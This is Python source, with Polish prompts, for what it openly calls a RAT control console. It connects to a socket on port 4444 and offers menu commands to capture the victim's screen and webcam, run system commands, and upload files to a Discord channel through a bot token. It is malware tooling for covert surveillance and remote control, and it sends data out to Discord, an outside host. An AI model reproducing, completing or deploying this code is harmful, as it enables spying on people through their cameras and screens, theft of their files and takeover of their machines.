import socket
import time
import requests
import subprocess
import threading 
import webbrowser

HOST = '127.0.0.1'  
PORT = 4444  

DISCORD_BOT_TOKEN = 'TOKEN_BOTA'
DISCORD_CHANNEL_ID = 'KANAL DC'  

rat_art = '''
$$$$$$$\   $$$$$$\ $$$$$$$$\ 
$$  __$$\ $$  __$$\\__$$  __| 
$$ |  $$ |$$ /  $$ |  $$ |   
$$$$$$$  |$$$$$$$$ |  $$ |   
$$  __$$< $$  __$$ |  $$ |   
$$ |  $$ |$$ |  $$ |  $$ |   
$$ |  $$ |$$ |  $$ |  $$ |   
\__|  \__|\__|  \__|  \__|  pzdr od rebixa ;)
                            '''

s = socket.socket()
s.connect((HOST, PORT))

def send_to_discord(file_path):
    url = f"https://discord.com/api/v9/channels/{DISCORD_CHANNEL_ID}/messages"
    headers = {
        "Authorization": f"Bot {DISCORD_BOT_TOKEN}"
    }
    with open(file_path, 'rb') as file:
        response = requests.post(url, headers=headers, files={'file': file})
    if response.status_code == 200:
        print("")
    else:
        print(f"jakis error :(: {response.status_code}")

def send_command(cmd):
    s.send(cmd.encode())
    response = s.recv(1024).decode() 
    print(f"Wyjście z komendy:\n{response}")

def handle_screenshot():
    send_command('2')  
    time.sleep(1)  
    print("cyknięto fotcie i wyslano na dc")

def handle_camera():
    send_command('3')  
    time.sleep(1)  
    print("cyknięto fotcie kastiego i zostalo wysłane!")

def handel_webbrowser():
    webbrowser.open_new("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

def handle_system_command():
    system_command = input(">> ")
    try:
        result = subprocess.check_output(system_command, shell=True, stderr=subprocess.STDOUT)
        print(f"Wynik komendy:\n{result.decode()}")
        s.send(result)
    except subprocess.CalledProcessError as e:
        print(f"Błąd wykonania komendy: {e.output.decode()}")

def handle_ipconfig():
    system_command = "ipconfig"
    try:
        result = subprocess.check_output(system_command, shell=True, stderr=subprocess.STDOUT)
        decoded = result.decode("cp1252", errors="ignore")  
        print(f"Wynik komendy `ipconfig`:\n{decoded}")
        s.send(decoded.encode()) 
    except subprocess.CalledProcessError as e:
        print(f"Błąd wykonania komendy `ipconfig`: {e.output.decode('cp1252', errors='ignore')}")


def show_console():
    print(f"\n{rat_art}")
    print("Witaj w konsoli sterowania RAT!")
    print("Dostępne komendy:")
    print(" 1 - Zakończ (Zamyka połączenie)")
    print(" 2 - Zrzut ekranu")
    print(" 3 - Zdjęcie z kamery")
    print(" 4 - Uruchom komendę systemową")
    print(" 5 - Wyślij plik na Discorda")
    print(" 6 - Uruchom komendę `ipconfig`")
    print(" 7 - rick roll na kastim")

    while True:
        try:
            cmd = input("\nPodaj komendę: ")
            if cmd == '1':
                send_command('1')  
                print("Zamykanie połączenia...")
                s.close()
                break
            elif cmd == '2':
                threading.Thread(target=handle_screenshot).start()  
            elif cmd == '3':
                threading.Thread(target=handle_camera).start()  
            elif cmd == '4':
                threading.Thread(target=handle_system_command).start()  
            elif cmd == '5':
                file_path = input("Podaj ścieżkę do pliku, który chcesz wysłać: ")
                send_to_discord(file_path)  
            elif cmd == '6':
                handle_ipconfig()  
            elif cmd == '7':
                webbrowser.open_new("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
            else:
                print("Nieznana komenda!")
        except Exception as e:
            print(f"Coś poszło nie tak: {e}")

if __name__ == "__main__":
    show_console()
